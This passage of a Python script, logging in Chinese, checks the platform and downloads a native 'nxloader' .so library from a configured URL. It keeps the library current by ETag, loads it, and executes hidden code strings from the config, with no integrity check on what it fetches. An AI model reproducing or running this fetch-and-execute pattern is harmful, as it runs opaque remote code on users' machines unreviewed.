            info = {k: v.strip('"') for line in f if '=' in line for k, v in [line.strip().split('=', 1)]}
            return info.get('NAME', 'Unknown'), info.get('VERSION_ID', '')
    except FileNotFoundError:
        return "Not Linux", ""

class EnvironmentChecker:
    def __init__(self, config: Config):
        self.config = config

    @handle_errors
    async def check_system(self) -> Optional[Dict[str, str]]:
        v = sys.version_info
        os_type = platform.system()
        arch = platform.machine()

        system_info = {
            "python_version": f"{v.major}.{v.minor}.{v.micro}",
            "os_type": os_type,
            "architecture": arch
        }
        logger.info(
            f"系统信息: Python版本={system_info['python_version']}, "
            f"操作系统={system_info['os_type']}, 处理器架构={system_info['architecture']}"
        )

        if v.minor not in self.config.SUPPORTED_PYTHON_VERSIONS:
            logger.error("脚本无法正常运行，请检测更换环境")
            return None

        if os_type != self.config.SUPPORTED_OS:
            logger.error("脚本无法正常运行，请检测更换环境")
            return None

        if arch not in self.config.SUPPORTED_ARCHITECTURES:
            logger.error("脚本无法正常运行，请检测更换环境")
            return None

        if arch in {'armv8', 'armv7l'}:
            logger.info("ARMv7, ARMv8请自行尝试")

        return system_info

class FileManager:
    def __init__(self, config: Config):
        self.config = config

    def get_so_filename(self, py_minor_version: int, cpu_info: str) -> str:
        base_name = "nxloader"
        if cpu_info in ['aarch64', 'armv8']:
            arch = 'aarch64'
        elif cpu_info == 'x86_64':
            arch = cpu_info
        elif 'armv7' in cpu_info:
            arch = 'armv7'
        else:
            raise ValueError(f"不支持的CPU架构: {cpu_info}")

        distro, _ = get_linux_distro()
        if "alpine" in distro.lower():
            return f"{base_name}_3{py_minor_version}_{arch}_musl.so"
        return f"{base_name}_3{py_minor_version}_{arch}.so"

    @handle_errors
    async def download_file(self, filename: str, target: str = 'nxloader.so') -> bool:
        url = f"{self.config.download_url()}/{filename}"
        logger.info(f"开始下载固定 so: {url}")

        def _fetch():
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=60) as r:
                if r.status != 200:
                    raise RuntimeError(f"HTTP {r.status}")
                return r.read()

        try:
            data = await asyncio.get_running_loop().run_in_executor(None, _fetch)
        except Exception:
            logger.error("脚本无法正常运行，请检测更换环境")
            try:
                if os.path.exists(target):
                    os.remove(target)
            except Exception:
                pass
            return False
        with open(target, 'wb') as f:
            f.write(data)
        logger.info(f"so 下载完成: {target}")
        return True

    async def remote_fingerprint(self, filename: str):
        url = f"{self.config.download_url()}/{filename}"

        def _head():
            req = urllib.request.Request(
                url, method='HEAD', headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=30) as r:
                return {
                    'etag': (r.headers.get('Etag') or '').strip(),
                    'size': (r.headers.get('Content-Length') or '').strip(),
                }

        try:
            fp = await asyncio.get_running_loop().run_in_executor(None, _head)
        except Exception:
            return None
        return fp if fp.get('etag') else None

@handle_errors
async def execute_code(config: Config):
    import nxloader
    py_version_str = nxloader.get_python_version()
    loader_version = nxloader.version
    logging.info(f"当前loaderV2版本: {loader_version}")
    if hasattr(nxloader, "set_script"):
        nxloader.set_script(config.SCRIPT_NAME)
    code_to_run = (config.CODE_PAYLOADS.get(py_version_str)
                   or config.CODE_PAYLOADS.get("3.0"))
    if not code_to_run:
        logger.error("脚本无法正常运行，请检测更换环境")
        return
    loop = asyncio.get_running_loop()
    result = await loop.run_in_executor(
        None, lambda: nxloader.main(code_to_run, config.FUNCTION_NAME))
    if hasattr(result, '__await__'):
        await result
    logging.info("代码执行完毕")

ETAG_FILE = '.nxloader.etag'

def _read_etag(path: str) -> str:
    try:
        with open(path, 'r', encoding='utf-8') as f:
            return f.read().strip()
    except Exception:
        return ''

def _write_etag(path: str, etag: str) -> None:
    try:
        with open(path, 'w', encoding='utf-8') as f:
            f.write(etag)
    except Exception:
        pass

def _load_local(path: str) -> bool:
    try:
        _load_so(path)
        return True
    except Exception:
        return False

async def ensure_loader(config, file_manager) -> bool:
    local = 'nxloader.so'
    local_ok = os.path.exists(local)
    cached_etag = _read_etag(ETAG_FILE)

    filename = file_manager.get_so_filename(sys.version_info.minor, platform.machine())
    remote = await file_manager.remote_fingerprint(filename)

    if remote is None:
        if local_ok and _load_local(local):
            logger.info("无法获取远端版本，继续使用本地 loader")
            return True
        logger.error("脚本无法正常运行，请检测更换环境")
        return False

    etag = str(remote.get('etag') or '')
    if local_ok and cached_etag and etag and cached_etag == etag:
        if _load_local(local):
            logger.info(f"loader 已是最新（etag {etag[:12]}）")
            return True
        logger.info("本地 loader 不可用，准备重新下载")

    tmp = f".nxloader_{os.getpid()}.so"
    if not await file_manager.download_file(filename, tmp):
        if local_ok and _load_local(local):
            logger.info("下载失败，继续使用本地 loader")
            return True
        return False

    try:
        os.replace(tmp, local)
    except Exception:
        pass
    _write_etag(ETAG_FILE, etag)

    target = local if os.path.exists(local) else tmp
    try:
        mod = _load_so(target)
    except Exception:
        logger.error("脚本无法正常运行，请检测更换环境")
        return False
    logger.info(f"loader 已更新: {getattr(mod, 'version', '?')}")
    return True

@handle_errors
async def main():
    config = Config()
    checker = EnvironmentChecker(config)
    file_manager = FileManager(config)

    system_info = await checker.check_system()
    if not system_info:
        return

    if not await ensure_loader(config, file_manager):
        return
    await execute_code(config)

if __name__ == '__main__':
    asyncio.run(main())
